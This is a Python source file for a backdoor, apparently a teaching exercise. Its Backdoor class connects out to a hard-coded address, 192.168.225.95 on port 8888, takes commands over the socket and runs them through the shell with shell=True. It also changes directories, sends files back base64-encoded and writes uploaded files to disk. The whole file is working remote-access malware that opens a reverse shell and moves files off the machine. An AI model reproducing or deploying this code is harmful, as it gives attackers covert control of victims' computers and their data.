#!/usr/bin/env python
import os
import socket
import subprocess
import json
import base64


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


def change_directory(path):
    os.chdir(path)
    return "[+] changing working directory to "+path


def read_file(path):
    with open(path, 'rb') as file:
        return base64.b64encode(file.read())


def write_file(path, content):
    with open(path, 'wb') as file:
        file.write(base64.b64decode(content))
        return "[+] upload successful"


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        """
        It keeps on appending to json_data until it receives the full data
        :return: string
        """
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()

            try:
                if command[0] == 'cd' and len(command) > 1:
                    command_result = change_directory(command[1])
                elif command[0] == 'download'and len(command) > 1:
                    command_result = read_file(command[1])
                elif command[0] == 'upload' and len(command) > 1:
                    command_result = write_file(command[1], command[2])
                else:
                    command_result = execute_system_command(command)
            except Exception:
                command_result = "[-] Error encountered during command execution"

            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.225.95", 8888)
my_backdoor.run()
